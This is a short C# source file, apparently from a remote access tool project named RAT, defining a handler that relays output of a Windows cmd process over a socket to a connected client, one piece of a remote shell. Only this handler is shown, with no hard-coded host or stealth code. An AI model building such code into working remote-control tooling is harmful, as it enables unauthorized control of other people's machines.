using RAT.src.Interfaces;
using System.Diagnostics;
using System.Text;

namespace RAT.src.Cmd
{
    /// <summary>
    /// Logic related to windows cmd.
    /// </summary>
    public class CmdOutputHandler : ICmdLogic
    {
        private readonly ISocketConnectionSendingLogic _socketConnectionSendingLogic;
        private readonly ISocketStateLogic _stateLogic;

        /// <summary>
        /// Logic related to cmd.
        /// </summary>
        /// <param name="sendingLogic">Socket sending logic.</param>
        /// <param name="stateLogic">Our client state logic.</param>
        public CmdOutputHandler(
            ISocketConnectionSendingLogic sendingLogic,
            ISocketStateLogic stateLogic)
        {
            _socketConnectionSendingLogic = sendingLogic;
            _stateLogic = stateLogic;
        }

        /// <summary>
        /// This will send command execution output result to client regardless of output being error or not.
        /// </summary>
        /// <param name="sendingProcess">Sender.</param>
        /// <param name="outLine">Event sender's data.</param>
        public void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            var state = _stateLogic.State;

            if (outLine.Data != null &&
                state.CommandDataArray != null &&
                !state.ClientCmdProcess.HasExited)
            {
                string cleanCmdMessage = CmdHelper.GetFormattedCmdForResponse(outLine.Data);

                _socketConnectionSendingLogic.SendDataToClient(
                    state.ClientMainSocket, Encoding.ASCII.GetBytes(cleanCmdMessage), _socketConnectionSendingLogic.OnMessageSend);
            }
        }
    }
}